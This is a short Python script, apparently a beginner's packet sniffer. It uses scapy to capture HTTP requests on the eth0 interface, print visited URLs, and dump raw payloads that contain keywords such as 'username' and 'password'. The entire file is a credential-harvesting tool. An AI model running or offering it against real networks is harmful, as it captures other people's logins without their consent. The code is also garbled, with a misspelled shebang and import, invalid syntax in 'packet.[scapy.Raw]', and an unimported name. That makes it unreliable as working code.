#!usr/bin/eve python
import scapy.all as scapy
frpom scappy.layers import http
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[HTTPRequest].Host + packet[HTTPRequest].Path
        print(url)

        if packet.haslayer(scapy.Raw):
            load = packet.[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break
sniff("eth0")